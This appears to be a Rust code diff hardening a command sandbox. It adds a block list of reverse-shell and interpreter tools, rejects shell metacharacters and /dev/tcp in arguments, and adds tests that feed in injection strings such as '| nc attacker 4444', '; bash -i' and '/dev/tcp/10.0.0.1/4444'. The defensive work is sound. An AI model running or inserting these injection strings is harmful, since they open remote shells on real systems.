@@ -17,6 +17,9 @@ const DEFAULT_ALLOWED: &[&str] = &[
 const BLOCKED: &[&str] = &[
     "rm", "dd", "mkfs", "shutdown", "reboot", "poweroff", "halt", "init", "kill", "pkill",
     "mount", "fdisk", "iptables", "nft",
+    // Reverse shell / network exfil tools
+    "nc", "ncat", "socat", "telnet", "nmap", "bash", "sh", "zsh", "python", "python3",
+    "perl", "ruby", "php", "lua", "node", "gcc", "cc", "make", "chmod", "chown",
 ];
 
 const MAX_OUTPUT: usize = 1_048_576; // 1 MB
@@ -59,10 +62,17 @@ impl SandboxManager {
             }
         }
 
-        // Validate args don't contain path traversal
+        // Validate args don't contain path traversal or shell metacharacters
         for arg in args {
             if arg.contains("..") {
                 return Err("Path traversal detected in arguments".into());
+            }
+            // Block shell metacharacters that could enable injection
+            if arg.contains('|') || arg.contains(';') || arg.contains('`')
+                || arg.contains("$(") || arg.contains("${")
+                || arg.contains("/dev/tcp") || arg.contains("mkfifo")
+            {
+                return Err("Shell metacharacter detected in arguments".into());
             }
         }
 
@@ -123,7 +133,7 @@ mod tests {
     #[test]
     fn unlisted_command_rejected() {
         let sm = SandboxManager::new();
-        let result = sm.execute("python3", &[], None, 30);
+        let result = sm.execute("ffmpeg", &[], None, 30);
         assert!(result.is_err());
         assert!(result.unwrap_err().contains("not allowed"));
     }
@@ -189,5 +199,40 @@ mod tests {
         let output = result.unwrap();
         assert!(!output.stderr.is_empty());
         assert_ne!(output.exit_code, 0);
+    }
+
+    #[test]
+    fn reverse_shell_tools_blocked() {
+        let sm = SandboxManager::new();
+        for cmd in ["nc", "ncat", "socat", "bash", "sh", "python3", "perl", "ruby", "php"] {
+            let result = sm.execute(cmd, &[], None, 30);
+            assert!(result.is_err(), "{cmd} should be blocked");
+        }
+    }
+
+    #[test]
+    fn shell_metacharacters_in_args_blocked() {
+        let sm = SandboxManager::new();
+
+        let result = sm.execute("ls", &["| nc attacker 4444".to_string()], None, 30);
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("metacharacter"));
+
+        let result = sm.execute("ls", &["; bash -i".to_string()], None, 30);
+        assert!(result.is_err());
+
+        let result = sm.execute("cat", &["$(whoami)".to_string()], None, 30);
+        assert!(result.is_err());
+
+        let result = sm.execute("cat", &["`id`".to_string()], None, 30);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn dev_tcp_in_args_blocked() {
+        let sm = SandboxManager::new();
+        let result = sm.execute("cat", &["/dev/tcp/10.0.0.1/4444".to_string()], None, 30);
+        assert!(result.is_err());
+        assert!(result.unwrap_err().contains("metacharacter"));
     }
 }
